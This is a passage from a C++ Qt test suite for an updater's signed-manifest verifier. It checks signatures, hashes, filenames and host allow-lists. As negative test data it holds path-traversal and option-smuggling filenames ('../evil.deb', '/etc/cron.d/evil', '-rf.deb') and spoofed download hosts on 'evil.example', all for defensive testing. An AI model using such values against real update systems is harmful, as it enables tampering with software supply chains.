
#include "update/InstallType.h"
#include "update/SignatureVerifier.h"
#include "update/UpdateEndpoints.h"
#include "update/UpdateManifest.h"
#include "update/UpdateTrustStore.h"

#include <QHash>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonValue>
#include <QtTest/QtTest>

#include <openssl/evp.h>

using lightning::update::InstallType;
using lightning::update::isAllowedArtifactUrl;
using lightning::update::isAllowedFallbackManifestUrl;
using lightning::update::isAllowedManifestUrl;
using lightning::update::mirrorLatestManifestSignatureUrl;
using lightning::update::mirrorLatestManifestUrl;
using lightning::update::isSafeArtifactFilename;
using lightning::update::isValidSha256Hex;
using lightning::update::ManifestChannel;
using lightning::update::ManifestError;
using lightning::update::SignatureError;
using lightning::update::TrustStore;
using lightning::update::UpdateManifest;
using lightning::update::Version;

namespace {

class FixedTrustStore final : public TrustStore
{
public:
    QHash<QString, QString> keys;
    QString publicKeyForId(QStringView keyId) const override
    {
        return keys.value(keyId.toString());
    }
};

class TestSigner
{
public:
    ~TestSigner()
    {
        if (m_key)
            EVP_PKEY_free(m_key);
    }

    bool generate()
    {
        EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, nullptr);
        if (!ctx)
            return false;
        bool ok = EVP_PKEY_keygen_init(ctx) == 1 && EVP_PKEY_keygen(ctx, &m_key) == 1;
        EVP_PKEY_CTX_free(ctx);
        if (!ok || !m_key)
            return false;

        std::size_t length = 0;
        if (EVP_PKEY_get_raw_public_key(m_key, nullptr, &length) != 1 || length != 32)
            return false;
        QByteArray raw(int(length), Qt::Uninitialized);
        if (EVP_PKEY_get_raw_public_key(m_key, reinterpret_cast<unsigned char *>(raw.data()),
                                        &length)
            != 1) {
            return false;
        }
        m_publicKeyBase64 = QString::fromLatin1(raw.toBase64());
        return true;
    }

    QByteArray sign(const QByteArray &payload) const
    {
        EVP_MD_CTX *ctx = EVP_MD_CTX_new();
        if (!ctx)
            return {};
        QByteArray signature;
        std::size_t length = 0;
        if (EVP_DigestSignInit(ctx, nullptr, nullptr, nullptr, m_key) == 1
            && EVP_DigestSign(ctx, nullptr, &length,
                              reinterpret_cast<const unsigned char *>(payload.constData()),
                              std::size_t(payload.size()))
                == 1) {
            signature.resize(int(length));
            if (EVP_DigestSign(ctx, reinterpret_cast<unsigned char *>(signature.data()), &length,
                               reinterpret_cast<const unsigned char *>(payload.constData()),
                               std::size_t(payload.size()))
                != 1) {
                signature.clear();
            } else {
                signature.resize(int(length));
            }
        }
        EVP_MD_CTX_free(ctx);
        return signature;
    }

    QString publicKeyBase64() const { return m_publicKeyBase64; }

private:
    EVP_PKEY *m_key = nullptr;
    QString m_publicKeyBase64;
};

QByteArray makeEnvelope(const QString &keyId, const QByteArray &rawSignature,
                        const QString &algorithm = QStringLiteral("ed25519"))
{
    QJsonObject object;
    object.insert(QStringLiteral("alg"), algorithm);
    object.insert(QStringLiteral("key_id"), keyId);
    object.insert(QStringLiteral("sig"), QString::fromLatin1(rawSignature.toBase64()));
    return QJsonDocument(object).toJson(QJsonDocument::Compact);
}

QString canonicalArtifactUrl(const QString &filename)
{
    return QStringLiteral("https://%1/api/v4/projects/6/packages/generic/lightning/0.8.0/%2")
        .arg(lightning::update::canonicalUpdateHost(), filename);
}

QString mirrorHost()
{
    const QStringList hosts = lightning::update::mirrorArtifactHosts();
    return hosts.isEmpty() ? QString() : hosts.first();
}

QString mirrorArtifactUrl(const QString &filename)
{
    return QStringLiteral("https://%1/Mizerd/lightning/releases/download/v0.8.0/%2")
        .arg(mirrorHost(), filename);
}

const QString kValidHash =
    QStringLiteral("0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef");

QJsonObject artifactObject(const QString &filename = QStringLiteral("lightning_0.8.0_amd64.deb"))
{
    QJsonObject artifact;
    artifact.insert(QStringLiteral("filename"), filename);
    artifact.insert(QStringLiteral("size"), 12345);
    artifact.insert(QStringLiteral("sha256"), kValidHash);
    artifact.insert(QStringLiteral("url"), canonicalArtifactUrl(filename));
    return artifact;
}

QJsonObject manifestWithMirror(const QJsonValue &mirror,
                               const QString &filename = QStringLiteral(
                                   "lightning_0.8.0_amd64.deb"));

QJsonObject baseManifest()
{
    QJsonObject manifest;
    manifest.insert(QStringLiteral("schema"), 1);
    manifest.insert(QStringLiteral("version"), QStringLiteral("0.8.0"));
    manifest.insert(QStringLiteral("channel"), QStringLiteral("stable"));
    manifest.insert(QStringLiteral("tag"), QStringLiteral("v0.8.0"));
    manifest.insert(QStringLiteral("released"), QStringLiteral("2026-08-16T12:00:00Z"));
    manifest.insert(QStringLiteral("expires"), QStringLiteral("2026-12-14T12:00:00Z"));
    manifest.insert(QStringLiteral("min_updater_version"), 1);
    manifest.insert(QStringLiteral("release_notes"), QStringLiteral("markdown"));

    QJsonObject artifacts;
    artifacts.insert(QStringLiteral("linux-deb"), artifactObject());
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    return manifest;
}

QJsonObject manifestWithMirror(const QJsonValue &mirror, const QString &filename)
{
    QJsonObject manifest = baseManifest();
    QJsonObject artifact = artifactObject(filename);
    if (!mirror.isUndefined())
        artifact.insert(QStringLiteral("mirror_url"), mirror);
    QJsonObject artifacts;
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    return manifest;
}

QByteArray serialise(const QJsonObject &object)
{
    return QJsonDocument(object).toJson(QJsonDocument::Compact);
}

}

class UpdateManifestTest : public QObject
{
    Q_OBJECT

public:
    UpdateManifestTest() = default;

private:
    TestSigner m_signer;
    FixedTrustStore m_trust;
    static constexpr char kKeyId[] = "lightning-release-test";

    UpdateManifest::Result verify(const QByteArray &manifestBytes)
    {
        return UpdateManifest::parseVerified(manifestBytes,
                                             makeEnvelope(QString::fromLatin1(kKeyId),
                                                          m_signer.sign(manifestBytes)),
                                             m_trust);
    }
    UpdateManifest::Result verify(const QJsonObject &manifest)
    {
        return verify(serialise(manifest));
    }

private slots:
    void initTestCase();

    void verifiesAValidManifest();
    void rejectsATamperedManifest();
    void rejectsAnUnknownKeyId();
    void rejectsARetiredOrAbsentCompiledKey();
    void rejectsAnUnsupportedAlgorithm();
    void rejectsAMalformedSignatureLength();
    void rejectsAnEmptySignatureDocument();
    void verifiesBeforeParsing();
    void rejectsSchemaTwoDistinctly();
    void rejectsANewerUpdaterRequirement();
    void rejectsANonPositiveUpdaterRequirement_data();
    void rejectsANonPositiveUpdaterRequirement();
    void rejectsAMalformedVersion();
    void rejectsAMissingChannel();
    void rejectsABadChecksum_data();
    void rejectsABadChecksum();
    void rejectsABadSize_data();
    void rejectsABadSize();
    void rejectsAnUnsafeFilename_data();
    void rejectsAnUnsafeFilename();
    void rejectsANonHttpsUrl();
    void rejectsAForeignHost();
    void rejectsAUrlThatDisagreesWithTheFilename();
    void rejectsAForeignReleaseNotesLink();
    void rejectsAReleaseNotesLinkOnAMirrorHost();
    void acceptsAnOptionalMirrorUrl();
    void anArtifactWithoutAMirrorIsUnchanged();
    void rejectsAMirrorOnAnUnlistedHost_data();
    void rejectsAMirrorOnAnUnlistedHost();
    void rejectsACanonicalUrlOnAMirrorHost();
    void rejectsAnInsecureOrMalformedMirrorUrl_data();
    void rejectsAnInsecureOrMalformedMirrorUrl();
    void rejectsAMirrorThatDisagreesWithTheFilename();
    void separatesMetadataAndArtifactHostPolicies();
    void ignoresUnknownFieldsAndArtifactKeys();
    void manifestCanNeverCarryACommand();
    void modelsEcosystemChannels();
    void aRepositoryRpmReadsItsChannelAndNeverAnArtifact();
    void validatesHashAndFilenameHelpers();
    void validatesUpdateUrls();
    void expiryIsOptionalAndInformational();
    void aMalformedExpiryReadsAsNone_data();
    void aMalformedExpiryReadsAsNone();
    void boundsAChannelNote();
};

void UpdateManifestTest::initTestCase()
{
    QVERIFY2(m_signer.generate(), "OpenSSL could not generate an Ed25519 keypair");
    m_trust.keys.insert(QString::fromLatin1(kKeyId), m_signer.publicKeyBase64());
}

void UpdateManifestTest::verifiesAValidManifest()
{
    const UpdateManifest::Result result = verify(baseManifest());
    QVERIFY2(result.ok, qPrintable(result.message));
    QCOMPARE(result.error, ManifestError::None);

    const UpdateManifest &manifest = result.manifest;
    QVERIFY(manifest.isValid());
    QCOMPARE(manifest.schema(), 1);
    QCOMPARE(manifest.versionString(), QStringLiteral("0.8.0"));
    QCOMPARE(manifest.channel(), QStringLiteral("stable"));
    QCOMPARE(manifest.tag(), QStringLiteral("v0.8.0"));
    QCOMPARE(manifest.signingKeyId(), QString::fromLatin1(kKeyId));
    QVERIFY(manifest.released().isValid());

    const auto artifact = manifest.artifactFor(InstallType::LinuxDeb);
    QVERIFY(artifact.has_value());
    QCOMPARE(artifact->filename, QStringLiteral("lightning_0.8.0_amd64.deb"));
    QCOMPARE(artifact->size, qint64(12345));
    QCOMPARE(artifact->sha256, kValidHash);
    QCOMPARE(artifact->url.scheme(), QStringLiteral("https"));

    QVERIFY(!manifest.artifactFor(InstallType::LinuxRpm).has_value());
}

void UpdateManifestTest::rejectsATamperedManifest()
{
    QByteArray bytes = serialise(baseManifest());
    const QByteArray signature = m_signer.sign(bytes);
    const qsizetype index = bytes.indexOf("0.8.0");
    QVERIFY(index > 0);
    bytes[index + 2] = '9';

    const UpdateManifest::Result result = UpdateManifest::parseVerified(
        bytes, makeEnvelope(QString::fromLatin1(kKeyId), signature), m_trust);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::SignatureInvalid);
    QVERIFY(!result.manifest.isValid());
}

void UpdateManifestTest::rejectsAnUnknownKeyId()
{
    const QByteArray bytes = serialise(baseManifest());
    const UpdateManifest::Result result = UpdateManifest::parseVerified(
        bytes, makeEnvelope(QStringLiteral("attacker-key-2027"), m_signer.sign(bytes)), m_trust);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::SignatureUnknownKey);
}

void UpdateManifestTest::rejectsARetiredOrAbsentCompiledKey()
{
    lightning::update::CompiledTrustStore compiled;
    const QByteArray bytes = serialise(baseManifest());
    const UpdateManifest::Result result = UpdateManifest::parseVerified(
        bytes, makeEnvelope(QStringLiteral("lightning-release-2026a"), m_signer.sign(bytes)),
        compiled);
    QVERIFY(!result.ok);
    if (lightning::update::hasUsableTrustedKey()) {
        QCOMPARE(result.error, ManifestError::SignatureInvalid);
    } else {
        QCOMPARE(result.error, ManifestError::SignatureUnknownKey);
    }
    QVERIFY(lightning::update::findKey(QStringLiteral("no-such-key")) == nullptr);
}

void UpdateManifestTest::rejectsAnUnsupportedAlgorithm()
{
    const QByteArray bytes = serialise(baseManifest());
    const UpdateManifest::Result result = UpdateManifest::parseVerified(
        bytes,
        makeEnvelope(QString::fromLatin1(kKeyId), m_signer.sign(bytes), QStringLiteral("none")),
        m_trust);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::SignatureUnsupportedAlgorithm);

    const UpdateManifest::Result rsa = UpdateManifest::parseVerified(
        bytes,
        makeEnvelope(QString::fromLatin1(kKeyId), m_signer.sign(bytes),
                     QStringLiteral("rsa-pkcs1")),
        m_trust);
    QCOMPARE(rsa.error, ManifestError::SignatureUnsupportedAlgorithm);
}

void UpdateManifestTest::rejectsAMalformedSignatureLength()
{
    const QByteArray bytes = serialise(baseManifest());
    const QByteArray signature = m_signer.sign(bytes);
    QCOMPARE(signature.size(), qsizetype(64));

    QByteArray truncated = signature;
    truncated.chop(1);
    QCOMPARE(UpdateManifest::parseVerified(
                 bytes, makeEnvelope(QString::fromLatin1(kKeyId), truncated), m_trust)
                 .error,
             ManifestError::SignatureMalformed);

    QByteArray extended = signature;
    extended.append('\0');
    QCOMPARE(UpdateManifest::parseVerified(
                 bytes, makeEnvelope(QString::fromLatin1(kKeyId), extended), m_trust)
                 .error,
             ManifestError::SignatureMalformed);

    SignatureError parseError = SignatureError::None;
    QVERIFY(!lightning::update::parseSignatureEnvelope(
                 QByteArrayLiteral(R"({"alg":"ed25519","key_id":"k","sig":"not base64 !!"})"),
                 &parseError)
                 .has_value());
    QCOMPARE(parseError, SignatureError::MalformedSignature);
}

void UpdateManifestTest::rejectsAnEmptySignatureDocument()
{
    const QByteArray bytes = serialise(baseManifest());
    QCOMPARE(UpdateManifest::parseVerified(bytes, QByteArray(), m_trust).error,
             ManifestError::SignatureMissing);
    QCOMPARE(UpdateManifest::parseVerified(bytes, QByteArrayLiteral("{}"), m_trust).error,
             ManifestError::SignatureMalformed);
    const QByteArray huge(int(lightning::update::kMaxSignatureEnvelopeBytes) + 1, 'x');
    QCOMPARE(UpdateManifest::parseVerified(bytes, huge, m_trust).error,
             ManifestError::SignatureMalformed);
}

void UpdateManifestTest::verifiesBeforeParsing()
{
    const QByteArray garbage = QByteArrayLiteral("this is not json at all");
    const QByteArray foreignSignature = m_signer.sign(QByteArrayLiteral("a different payload"));
    const UpdateManifest::Result unsigned_ = UpdateManifest::parseVerified(
        garbage, makeEnvelope(QString::fromLatin1(kKeyId), foreignSignature), m_trust);
    QVERIFY(!unsigned_.ok);
    QCOMPARE(unsigned_.error, ManifestError::SignatureInvalid);

    const UpdateManifest::Result signedGarbage = verify(garbage);
    QVERIFY(!signedGarbage.ok);
    QCOMPARE(signedGarbage.error, ManifestError::ManifestNotJson);

    const QByteArray array = QByteArrayLiteral("[1,2,3]");
    QCOMPARE(verify(array).error, ManifestError::ManifestNotObject);
}

void UpdateManifestTest::rejectsSchemaTwoDistinctly()
{
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("schema"), 2);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::UnsupportedSchema);
    QVERIFY(result.message.contains(QStringLiteral("manually")));

    manifest.insert(QStringLiteral("schema"), QStringLiteral("1"));
    QCOMPARE(verify(manifest).error, ManifestError::UnsupportedSchema);

    manifest.remove(QStringLiteral("schema"));
    QCOMPARE(verify(manifest).error, ManifestError::UnsupportedSchema);
}

void UpdateManifestTest::rejectsANewerUpdaterRequirement()
{
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("min_updater_version"), 2);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::UnsupportedUpdaterVersion);
}

void UpdateManifestTest::rejectsANonPositiveUpdaterRequirement_data()
{
    QTest::addColumn<QJsonValue>("value");

    QTest::newRow("zero") << QJsonValue(0);
    QTest::newRow("negative") << QJsonValue(-1);
    QTest::newRow("fractional") << QJsonValue(0.5);
    QTest::newRow("string") << QJsonValue(QStringLiteral("1"));
    QTest::newRow("null") << QJsonValue(QJsonValue::Null);
    QTest::newRow("bool") << QJsonValue(true);
}

void UpdateManifestTest::rejectsANonPositiveUpdaterRequirement()
{
    QFETCH(QJsonValue, value);
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("min_updater_version"), value);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::UnsupportedUpdaterVersion);
}

void UpdateManifestTest::rejectsAMalformedVersion()
{
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("version"), QStringLiteral("v0.8"));
    QCOMPARE(verify(manifest).error, ManifestError::MalformedVersion);

    manifest.remove(QStringLiteral("version"));
    QCOMPARE(verify(manifest).error, ManifestError::MissingVersion);
}

void UpdateManifestTest::rejectsAMissingChannel()
{
    QJsonObject manifest = baseManifest();
    manifest.remove(QStringLiteral("channel"));
    QCOMPARE(verify(manifest).error, ManifestError::MissingChannel);
}

void UpdateManifestTest::rejectsABadChecksum_data()
{
    QTest::addColumn<QString>("hash");
    QTest::newRow("too short") << kValidHash.left(63);
    QTest::newRow("too long") << (kValidHash + QStringLiteral("a"));
    QTest::newRow("uppercase") << kValidHash.toUpper();
    QTest::newRow("non hex") << QString(kValidHash).replace(0, 1, QStringLiteral("z"));
    QTest::newRow("empty") << QString();
}

void UpdateManifestTest::rejectsABadChecksum()
{
    QFETCH(QString, hash);
    QJsonObject manifest = baseManifest();
    QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
    QJsonObject artifact = artifacts.value(QStringLiteral("linux-deb")).toObject();
    artifact.insert(QStringLiteral("sha256"), hash);
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadHash);
}

void UpdateManifestTest::rejectsABadSize_data()
{
    QTest::addColumn<qint64>("size");
    QTest::newRow("zero") << qint64(0);
    QTest::newRow("negative") << qint64(-1);
    QTest::newRow("beyond the client ceiling")
        << qint64(UpdateManifest::kMaxArtifactBytes + 1);
}

void UpdateManifestTest::rejectsABadSize()
{
    QFETCH(qint64, size);
    QJsonObject manifest = baseManifest();
    QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
    QJsonObject artifact = artifacts.value(QStringLiteral("linux-deb")).toObject();
    artifact.insert(QStringLiteral("size"), size);
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadSize);
}

void UpdateManifestTest::rejectsAnUnsafeFilename_data()
{
    QTest::addColumn<QString>("filename");
    QTest::newRow("parent traversal") << "../evil.deb";
    QTest::newRow("nested traversal") << "a/../../evil.deb";
    QTest::newRow("absolute") << "/etc/cron.d/evil";
    QTest::newRow("backslash") << "..\\evil.deb";
    QTest::newRow("dot dot only") << "..";
    QTest::newRow("leading dash") << "-rf.deb";
    QTest::newRow("empty") << "";
    QTest::newRow("newline") << "evil\n.deb";
    QTest::newRow("windows stream") << "evil.deb:stream";
}

void UpdateManifestTest::rejectsAnUnsafeFilename()
{
    QFETCH(QString, filename);
    QVERIFY(!isSafeArtifactFilename(filename));

    QJsonObject manifest = baseManifest();
    QJsonObject artifacts;
    QJsonObject artifact = artifactObject();
    artifact.insert(QStringLiteral("filename"), filename);
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadFilename);
}

void UpdateManifestTest::rejectsANonHttpsUrl()
{
    QJsonObject manifest = baseManifest();
    QJsonObject artifacts;
    QJsonObject artifact = artifactObject();
    artifact.insert(QStringLiteral("url"),
                    QStringLiteral("http://%1/api/v4/projects/6/packages/generic/lightning/"
                                   "0.8.0/lightning_0.8.0_amd64.deb")
                        .arg(lightning::update::canonicalUpdateHost()));
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadUrl);

    artifact.insert(QStringLiteral("url"), QStringLiteral("file:///tmp/lightning_0.8.0_amd64.deb"));
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactBadUrl);
}

void UpdateManifestTest::rejectsAForeignHost()
{
    const QStringList foreign{
        QStringLiteral("https://evil.example/lightning_0.8.0_amd64.deb"),
        QStringLiteral("https://evil-%1/lightning_0.8.0_amd64.deb")
            .arg(lightning::update::canonicalUpdateHost()),
        QStringLiteral("https://%1.evil.example/lightning_0.8.0_amd64.deb")
            .arg(lightning::update::canonicalUpdateHost()),
        QStringLiteral("https://user:pass@%1/lightning_0.8.0_amd64.deb")
            .arg(lightning::update::canonicalUpdateHost()),
    };
    for (const QString &url : foreign) {
        QJsonObject manifest = baseManifest();
        QJsonObject artifacts;
        QJsonObject artifact = artifactObject();
        artifact.insert(QStringLiteral("url"), url);
        artifacts.insert(QStringLiteral("linux-deb"), artifact);
        manifest.insert(QStringLiteral("artifacts"), artifacts);
        QCOMPARE(verify(manifest).error, ManifestError::ArtifactForeignHost);
    }
}

void UpdateManifestTest::rejectsAUrlThatDisagreesWithTheFilename()
{
    QJsonObject manifest = baseManifest();
    QJsonObject artifacts;
    QJsonObject artifact = artifactObject();
    artifact.insert(QStringLiteral("filename"), QStringLiteral("lightning_0.8.0_amd64.deb"));
    artifact.insert(QStringLiteral("url"), canonicalArtifactUrl(QStringLiteral("other.deb")));
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    QCOMPARE(verify(manifest).error, ManifestError::ArtifactFilenameMismatch);
}

void UpdateManifestTest::rejectsAForeignReleaseNotesLink()
{
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("release_notes_url"),
                    QStringLiteral("https://evil.example/notes"));
    QCOMPARE(verify(manifest).error, ManifestError::ReleaseNotesUrlRejected);

    manifest.insert(QStringLiteral("release_notes_url"),
                    QStringLiteral("https://%1/Mizerd/lightning/-/releases/v0.8.0")
                        .arg(lightning::update::canonicalUpdateHost()));
    const UpdateManifest::Result ok = verify(manifest);
    QVERIFY2(ok.ok, qPrintable(ok.message));
    QCOMPARE(ok.manifest.releaseNotesUrl().host(), lightning::update::canonicalUpdateHost());
}

void UpdateManifestTest::rejectsAReleaseNotesLinkOnAMirrorHost()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");

    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("release_notes_url"),
                    QStringLiteral("https://%1/Mizerd/lightning/releases/tag/v0.8.0")
                        .arg(mirrorHost()));
    QCOMPARE(verify(manifest).error, ManifestError::ReleaseNotesUrlRejected);

    QVERIFY(!isAllowedManifestUrl(
        QUrl(QStringLiteral("https://%1/Mizerd/lightning/releases/tag/v0.8.0").arg(mirrorHost()))));
    QVERIFY(isAllowedArtifactUrl(QUrl(mirrorArtifactUrl(QStringLiteral("x.deb")))));
}

void UpdateManifestTest::rejectsACanonicalUrlOnAMirrorHost()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");

    const QString filename = QStringLiteral("lightning_0.8.0_amd64.deb");
    QJsonObject manifest = baseManifest();
    QJsonObject artifact = artifactObject(filename);
    artifact.insert(QStringLiteral("url"), mirrorArtifactUrl(filename));
    QJsonObject artifacts;
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);

    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(!result.ok, "a canonical URL on a mirror host must be refused");
    QCOMPARE(result.error, ManifestError::ArtifactForeignHost);
}

void UpdateManifestTest::acceptsAnOptionalMirrorUrl()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");

    const QString filename = QStringLiteral("lightning_0.8.0_amd64.deb");
    const UpdateManifest::Result result =
        verify(manifestWithMirror(QJsonValue(mirrorArtifactUrl(filename))));
    QVERIFY2(result.ok, qPrintable(result.message));
    QCOMPARE(result.manifest.schema(), 1);

    const auto artifact = result.manifest.artifactFor(InstallType::LinuxDeb);
    QVERIFY(artifact.has_value());
    QCOMPARE(artifact->mirrorUrl.toString(), mirrorArtifactUrl(filename));
    QCOMPARE(artifact->mirrorUrl.host(), mirrorHost());
    QCOMPARE(artifact->mirrorUrl.fileName(), filename);
    QCOMPARE(artifact->url.host(), lightning::update::canonicalUpdateHost());
    QVERIFY(!artifact->mirrorUrl.path().contains(QStringLiteral("releases/latest")));

    const UpdateManifest::Result nulled =
        verify(manifestWithMirror(QJsonValue(QJsonValue::Null)));
    QVERIFY2(nulled.ok, qPrintable(nulled.message));
    QVERIFY(nulled.manifest.artifactFor(InstallType::LinuxDeb)->mirrorUrl.isEmpty());
}

void UpdateManifestTest::anArtifactWithoutAMirrorIsUnchanged()
{
    const UpdateManifest::Result result = verify(baseManifest());
    QVERIFY2(result.ok, qPrintable(result.message));
    const auto artifact = result.manifest.artifactFor(InstallType::LinuxDeb);
    QVERIFY(artifact.has_value());
    QVERIFY(artifact->mirrorUrl.isEmpty());
    QVERIFY(!artifact->mirrorUrl.isValid());
    QCOMPARE(artifact->url.toString(),
             canonicalArtifactUrl(QStringLiteral("lightning_0.8.0_amd64.deb")));
}

void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost_data()
{
    QTest::addColumn<QString>("url");
    const QString mirror = mirrorHost();
    const QString file = QStringLiteral("lightning_0.8.0_amd64.deb");

    QTest::newRow("unrelated host")
        << QStringLiteral("https://evil.example/%1").arg(file);
    QTest::newRow("suffix trick") << QStringLiteral("https://evil-%1/%2").arg(mirror, file);
    QTest::newRow("subdomain trick")
        << QStringLiteral("https://%1.evil.example/%2").arg(mirror, file);
    QTest::newRow("credentials") << QStringLiteral("https://user:pass@%1/%2").arg(mirror, file);
    QTest::newRow("non standard port")
        << QStringLiteral("https://%1:8443/%2").arg(mirror, file);
}

void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");
    QFETCH(QString, url);
    const UpdateManifest::Result result = verify(manifestWithMirror(QJsonValue(url)));
    QVERIFY2(result.ok, qPrintable(result.message));
    QVERIFY(result.manifest.isValid());
    QCOMPARE(result.manifest.untrustedMirrorCount(), 1);

    const auto artifact = result.manifest.artifactFor(InstallType::LinuxDeb);
    QVERIFY(artifact.has_value());
    QVERIFY(artifact->mirrorUrl.isEmpty());
    QCOMPARE(artifact->url.host(), lightning::update::canonicalUpdateHost());
    QCOMPARE(artifact->sha256, kValidHash);
}

void UpdateManifestTest::rejectsAnInsecureOrMalformedMirrorUrl_data()
{
    QTest::addColumn<QJsonValue>("mirror");
    const QString mirror = mirrorHost();
    const QString file = QStringLiteral("lightning_0.8.0_amd64.deb");

    QTest::newRow("http") << QJsonValue(QStringLiteral("http://%1/%2").arg(mirror, file));
    QTest::newRow("file") << QJsonValue(QStringLiteral("file:///tmp/%1").arg(file));
    QTest::newRow("ftp") << QJsonValue(QStringLiteral("ftp://%1/%2").arg(mirror, file));
    QTest::newRow("relative") << QJsonValue(QStringLiteral("/downloads/%1").arg(file));
    QTest::newRow("empty string") << QJsonValue(QString());
    QTest::newRow("not a string") << QJsonValue(42);
    QTest::newRow("object") << QJsonValue(QJsonObject{ { QStringLiteral("url"), file } });
}

void UpdateManifestTest::rejectsAnInsecureOrMalformedMirrorUrl()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");
    QFETCH(QJsonValue, mirror);
    const UpdateManifest::Result result = verify(manifestWithMirror(mirror));
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::ArtifactBadMirrorUrl);
}

void UpdateManifestTest::rejectsAMirrorThatDisagreesWithTheFilename()
{
    if (mirrorHost().isEmpty())
        QSKIP("this build trusts no artifact mirror");
    const UpdateManifest::Result result =
        verify(manifestWithMirror(QJsonValue(mirrorArtifactUrl(QStringLiteral("other.deb")))));
    QVERIFY(!result.ok);
    QCOMPARE(result.error, ManifestError::ArtifactFilenameMismatch);
}

void UpdateManifestTest::separatesMetadataAndArtifactHostPolicies()
{
    const QString canonical = lightning::update::canonicalUpdateHost();
    const QStringList mirrors = lightning::update::mirrorArtifactHosts();

#ifndef LIGHTNING_UPDATE_MIRROR_HOSTS
    QCOMPARE(mirrors,
             (QStringList{ QStringLiteral("github.com"),
                           QStringLiteral("objects.githubusercontent.com"),
                           QStringLiteral("release-assets.githubusercontent.com") }));
#endif

    const QUrl mirrorManifest = mirrorLatestManifestUrl();
    const QUrl mirrorSignature = mirrorLatestManifestSignatureUrl();
    if (!mirrorManifest.isEmpty()) {
        QVERIFY(isAllowedFallbackManifestUrl(mirrorManifest));
        QVERIFY(isAllowedFallbackManifestUrl(mirrorSignature));
        QVERIFY(!isAllowedManifestUrl(mirrorManifest));
        QVERIFY(!isAllowedManifestUrl(mirrorSignature));
        QCOMPARE(mirrorManifest.scheme(), QStringLiteral("https"));
        QVERIFY(mirrorManifest.userInfo().isEmpty());
        QVERIFY(mirrors.contains(mirrorManifest.host().toLower()));
        QVERIFY(mirrorManifest != mirrorSignature);
        QVERIFY(!mirrorManifest.path().contains(QStringLiteral("releases/latest")));
    }
    QVERIFY(!isAllowedFallbackManifestUrl(
        QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));

    QVERIFY(isAllowedManifestUrl(QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));
    QVERIFY(isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1/a/b").arg(canonical))));
    QVERIFY(!mirrors.contains(canonical));

    for (const QString &host : mirrors) {
        QCOMPARE(host, host.toLower());
        QVERIFY(!host.contains(QLatin1Char('/')));
        QVERIFY(!host.contains(QLatin1Char(':')));
        QVERIFY(!host.isEmpty());
        const QUrl url(QStringLiteral("https://%1/Mizerd/lightning/releases/download/v0.8.0/a.deb")
                           .arg(host));
        QVERIFY2(isAllowedArtifactUrl(url), qPrintable(host));
        QVERIFY2(!isAllowedManifestUrl(url), qPrintable(host));
        QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("http://%1/a.deb").arg(host))));
        QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1:8443/a.deb").arg(host))));
        QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://u:p@%1/a.deb").arg(host))));
        QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://evil-%1/a.deb").arg(host))));
        QVERIFY(!isAllowedArtifactUrl(QUrl(QStringLiteral("https://%1.evil.example/a.deb").arg(host))));
    }

    const QStringList all = lightning::update::allowedUpdateHosts();
    QVERIFY(!all.isEmpty());
    QCOMPARE(all.first(), canonical);
    for (const QString &host : mirrors)
        QVERIFY(all.contains(host));
}

void UpdateManifestTest::ignoresUnknownFieldsAndArtifactKeys()
{
    QJsonObject manifest = baseManifest();
